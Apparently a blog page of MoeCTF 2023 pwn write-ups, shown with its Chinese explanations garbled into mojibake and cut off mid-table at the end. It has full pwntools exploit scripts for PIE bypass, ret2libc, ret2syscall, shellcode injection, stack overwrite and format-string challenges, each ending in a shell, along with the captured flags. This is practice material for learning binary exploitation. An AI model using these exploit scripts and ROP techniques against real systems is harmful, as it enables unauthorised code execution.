<p>å…·ä½“æ€ä¹ˆæ“ä½œæˆ‘æ˜¯çœ‹è¿™ç¯‡æ–‡ç« å­¦ä¼šçš„<br><a target="_blank" rel="noopener" href="https://ir0nstone.gitbook.io/notes/types/stack/pie/pie-exploit">https://ir0nstone.gitbook.io/notes/types/stack/pie/pie-exploit</a> </p>
<p>é¦–å…ˆéœ€è¦å°†context.binary è®¾ç½®æˆ ELF(.&#x2F;pwn)</p>
<p>elf.address &#x3D; vuln - elf.sym[â€˜vulnâ€™] è¿™é‡Œæ ¹æ®elfçš„ç¬¦å·è¡¨çš„åç§» ç®—å‡ºåŸºåœ°å€</p>
<p>ä¸‹é¢payloadä¸­gadgetåªéœ€è¦åŠ ä¸Šelf.address è¿™ä¸ªåŸºåœ°å€å°±å¯ä»¥äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">ip = <span class="string">&quot;192.168.1.129&quot;</span></span><br><span class="line">port = <span class="number">57376</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"></span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;This time i will give u a gift!\n&quot;</span>); <span class="built_in">print</span>(line) <span class="comment"># This time i will give u a gift!\n</span></span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;Vuln&#x27;s address is:&quot;</span>); <span class="built_in">print</span>(line) <span class="comment"># Vuln&#x27;s address is:%p\n</span></span><br><span class="line"></span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line">line = line.replace(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;&quot;</span>); <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line">vuln = <span class="built_in">int</span>(line, <span class="number">16</span>)</span><br><span class="line">elf.address = vuln - elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">80</span> + <span class="number">8</span>) <span class="comment"># offset = buf[80] + 8(byte) = r</span></span><br><span class="line"></span><br><span class="line">payload += p64(elf.address + <span class="number">0x00101a</span>) <span class="comment"># ret_address</span></span><br><span class="line">payload += p64(elf.address + <span class="number">0x001323</span>) <span class="comment"># gadget_address pop rdi ; ret</span></span><br><span class="line">payload += p64(elf.address + <span class="number">0x004010</span>) <span class="comment"># /bin/sh address</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;3N3evVehPhOpH9nNLAd6KmD_Z8jhY36t&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hide the b4ckdoor..\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But..maybe libc can help u??\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®é¢˜ç›®æ„æ€è¿˜æœ‰ç¨‹åºé€»è¾‘ï¼Œsystemå‡½æ•°è¢«ç§»é™¤äº†ï¼Œæ‰€ä»¥è¦åˆ°libcé‡Œé¢æ‰¾</p>
<p>linuxæ¯æ¬¡åŠ è½½ç¨‹åºçš„æ—¶å€™libcçš„åŸºåœ°å€éƒ½ä¼šæ”¹å˜ï¼Œä½†æ˜¯libcå†…çš„åç§»æ˜¯ä¸å˜çš„ï¼Œæƒ³è¦è°ƒç”¨systemè¿™ä¸ªå‡½æ•°ï¼Œé¦–å…ˆè¦æ³„éœ²libcçš„åŸºåœ°å€ï¼Œç„¶åæ ¹æ®åç§»åœ°å€å»æ‹¿åˆ°systemï¼Œè¿™æ—¶å€™å¯ä»¥æ„é€ ä¸€ä¸ªè¿™æ ·çš„è°ƒç”¨é“¾puts_plt(puts_got) æŠŠgotè¡¨ä¸­çš„putsçš„ä½ç½®æ‰“å°å‡ºæ¥ï¼Œ ç„¶åç”¨ puts_got å‡å»libcä¸­åŸºåœ°å€ä¸putsçš„åç§»å…³ç³»ï¼Œå°±èƒ½æ‹¿åˆ°libcçš„åŸºåœ°å€ï¼Œè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦å†å›åˆ°vuln functioné‡Œé¢ï¼Œå†readä¸€éï¼Œç”¨ä¹‹å‰çš„libc_base + systemåç§» ä»¥åŠ libc_base + bin&#x2F;shçš„åç§» æŠŠshellæ‹¿åˆ°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.1.111&quot;</span></span><br><span class="line">port = <span class="number">63227</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;I hide the b4ckdoor..\n&quot;</span>); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;But..maybe libc can help u??\n&quot;</span>); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># got è¡¨ä¸­çš„ putsåœ°å€</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># plt</span></span><br><span class="line">gadget_address = <span class="number">0x40117e</span>  <span class="comment"># pop rdi; ret</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">80</span> + <span class="number">8</span>)  <span class="comment"># offset r</span></span><br><span class="line">payload += p64(gadget_address)  <span class="comment"># pop rdi; ret</span></span><br><span class="line">payload += p64(puts_got)  <span class="comment"># puts_plt(put_gots)</span></span><br><span class="line">payload += p64(puts_plt)  <span class="comment"># puts(put_gots) æ‰“å°put_gotçš„åœ°å€</span></span><br><span class="line">payload += p64(<span class="number">0x4011E8</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¥æ”¶æ³„éœ²çš„åœ°å€</span></span><br><span class="line">leaked_puts = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Leaked puts address: <span class="subst">&#123;<span class="built_in">hex</span>(leaked_puts)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—libcçš„åŸºå€</span></span><br><span class="line">put_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_base = leaked_puts - put_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Libc base address: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###################################################################################</span></span><br><span class="line"><span class="comment"># é‡æ–°å›åˆ°vuln ç„¶åå†readä¸€éï¼Œæœ‰äº†libcçš„åŸºå€ å°±èƒ½æ ¹æ®åç§»æ‹¿åˆ°system /bin/sh</span></span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;I hide the b4ckdoor..\n&quot;</span>); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvuntil(<span class="string">b&quot;But..maybe libc can help u??\n&quot;</span>); <span class="built_in">print</span>(line)</span><br><span class="line">line = p.recvline(); <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#systemå®é™…åœ°å€</span></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment"># /bin/sh å®é™…åœ°å€</span></span><br><span class="line">ret_address = <span class="number">0x40101a</span> <span class="comment"># ret</span></span><br><span class="line">gadget_address = <span class="number">0x40117e</span> <span class="comment"># pop rdi ret</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">80</span> + <span class="number">8</span>) <span class="comment"># offset r</span></span><br><span class="line">payload += p64(ret_address) <span class="comment"># ret</span></span><br><span class="line">payload += p64(gadget_address) <span class="comment"># pop rdi ret</span></span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;zqCYX9rID5N8EvdK6cRpjzxGiKua-j6-&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>64ä½ syscallä¼šæ ¹æ®raxçš„å€¼å»è°ƒç”¨ç³»ç»Ÿï¼Œå…¶ä¸­æœ‰ä¸ªexecveçš„å‡½æ•°èƒ½å¤Ÿæ‰§è¡Œshellå‘½ä»¤ï¼Œç¼–å·æ˜¯59ã€‚</p>
<p>ç”¨æ³•æ˜¯å…ˆè®¾ç½®raxçš„å€¼ä¸º59æ¥é€‰æ‹©execveè¿™ä¸ªå‡½æ•°</p>
<p>ç„¶åè®¾ç½®rdi rsi rdx ä¸‰ä¸ªå¯„å­˜å™¨ä¼ é€’&#x2F;bin&#x2F; sh null nullä¸‰ä¸ªå‚æ•°è¿‡å»</p>
<p>æœ€åsyscallå°±å¥½äº†</p>
<p>32ä½å’Œ64ä½ä¸åŒçš„æ˜¯ä¼ å‚çš„è°ƒç”¨çº¦å®šå’Œç¼–å·</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/iszq8p">https://www.yuque.com/cyberangel/rg9gdm/iszq8p</a></p>
<p><a target="_blank" rel="noopener" href="https://publicki.top/old/syscall.html#x86_64-64_bit">https://publicki.top/old/syscall.html#x86_64-64_bit</a> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ret2syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.129.194&quot;</span></span><br><span class="line">port = <span class="number">57614</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process()</span></span><br><span class="line">p = remote(ip,port) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">line = p.recvline() ; <span class="built_in">print</span>(line) <span class="comment"># Can you make a syscall?</span></span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x401185</span></span><br><span class="line">pop_rax_ret = <span class="number">0x40117e</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401180</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x401182</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x401183</span></span><br><span class="line">pop_rsi_rdx_ret = <span class="number">0x401182</span></span><br><span class="line">binsh = <span class="number">0x404040</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&#x27;a&#x27;</span> * (<span class="number">64</span> + <span class="number">8</span>), <span class="comment"># offset r</span></span><br><span class="line">        pop_rax_ret, <span class="number">59</span>, <span class="comment"># execve(&quot;/bin/sh&quot; , NULL , NULL)</span></span><br><span class="line">        pop_rdi_ret, binsh ,</span><br><span class="line">        pop_rsi_rdx_ret , <span class="number">0</span> , <span class="number">0</span> ,</span><br><span class="line">        syscall_addr</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;3e8lLsjSF62Ebm55dV_11iZHHp7TFVUZ&#125;</span><br></pre></td></tr></table></figure>



<h2 id="shellcode-level2"><a href="#shellcode-level2" class="headerlink" title="shellcode_level2"></a>shellcode_level2</h2><p>è¿™é‡Œå¦‚æœè¾“å…¥æ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ä¸º0çš„è¯ï¼Œtest al al ä¼šå°†zfå¯„å­˜å™¨è®¾ç½®æˆ1ï¼Œç„¶åä¼šjzåˆå§‹åŒ–æˆ‘è¾“å…¥çš„æ•°æ®ï¼Œæ‰€ä»¥åªéœ€è¦ä¿è¯ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯0x00å°±å¥½äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+s]</span><br><span class="line">movzx   eax, byte ptr [rax]</span><br><span class="line">test    al, al</span><br><span class="line">jz      short loc_125D</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, 64h ; &#x27;d&#x27;  ; n</span><br><span class="line">mov     esi, 0          ; c</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _memset</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loc_125D:</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">add     rax, 1</span><br><span class="line">mov     [rbp+var_78], rax</span><br><span class="line">mov     rdx, [rbp+var_78]</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    rdx</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     rdx, [rbp+var_8]</span><br><span class="line">sub     rdx, fs:28h</span><br><span class="line">jz      short locret_128D</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.129.194&quot;</span></span><br><span class="line">port = <span class="number">63480</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode_level2&quot;)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode = <span class="string">b&#x27;\x00&#x27;</span> + shellcode</span><br><span class="line">payload = shellcode <span class="comment"># #</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;5WxAPxrGkQOTgaLi3fXkBZV8IKQEDBPF&#125;</span><br></pre></td></tr></table></figure>



<h2 id="uninitialized-key-plus"><a href="#uninitialized-key-plus" class="headerlink" title="uninitialized_key_plus"></a>uninitialized_key_plus</h2><p>å’Œuninitialized_keyç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨get_nameå‡½æ•°é‚£æ˜¯scanf %24sï¼Œç„¶åä½ç½®æœ‰äº›ä¸å¤ªä¸€æ ·idaé‡Œé¢çœ‹å†…å­˜å¸ƒå±€ç®—ä¸€ä¸‹å°±å¥½äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">ip = &quot;192.168.129.194&quot;</span><br><span class="line">port = 49771</span><br><span class="line">p = remote(ip, port)</span><br><span class="line"># p = process(&quot;./uninitialized_key_plus&quot;)</span><br><span class="line"></span><br><span class="line">line = p.recvline(); print(line) # Welcome to Moectf 2023.</span><br><span class="line">line = p.recvline(); print(line) # Do you know stack?</span><br><span class="line">line = p.recvline(); print(line) # Please input your name:</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27; * 20</span><br><span class="line">payload += p32(114514) # è½¬å››å­—èŠ‚</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">line = p.recvline(); print(line) # Your name is %s.\n</span><br><span class="line">line = p.recvline(); print(line) # Please input your key:</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;=&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;HEPwrkfbVLeO2t_8ea0K6PipJiGm2DQP&#125;</span><br></pre></td></tr></table></figure>



<h2 id="format-level1-è¡¥"><a href="#format-level1-è¡¥" class="headerlink" title="format_level1[è¡¥]"></a>format_level1[è¡¥]</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹ dragon.HP å°±å¥½äº†ï¼Œä¿®æ”¹pwnerçš„atk å­—ç¬¦ä¸²ä¼šé•¿ä¸€äº›ï¼Œè¾“å…¥é•¿åº¦ä¸å¤Ÿ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./format_level1&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.1.101&quot;</span></span><br><span class="line">    port = <span class="number">54822</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;<span class="number">0x804c00c</span>:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;Input what you want to talk: \n&quot;</span>,payload)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="little-canary-è¡¥"><a href="#little-canary-è¡¥" class="headerlink" title="little_canary[è¡¥]"></a>little_canary[è¡¥]</h2><p>ç¬¬ä¸€æ¬¡read è¦†ç›–canaryçš„ä½ä½00æŠŠcanaryæ‰“å°å‡ºæ¥ï¼Œç„¶åå¸¦ä¸Šcanaryæ‰“ret2libc ï¼Œé¢˜ç›®æ²¡æœ‰ç»™libcï¼Œæ‰€ä»¥è¦ç”¨libcsearcherä¸€ä¸‹</p>
<p>ret2libcçš„è¯ï¼Œæ„é€ ä¸€ä¸ª puts_plt(puts_got)çš„å‡½æ•°è°ƒç”¨å»æ‰“å°ä¸€ä¸ªlibcçš„åœ°å€ï¼Œç®—å‡ºlibc_baseåï¼Œlibcä¸­æœ‰binshå­—ç¬¦å’Œsystemå‡½æ•°ï¼Œå°±å¯ä»¥æ„é€ ä¸€ä¸ªsystem(&#x2F;bin&#x2F;sh)çš„å‡½æ•°è°ƒç”¨</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td 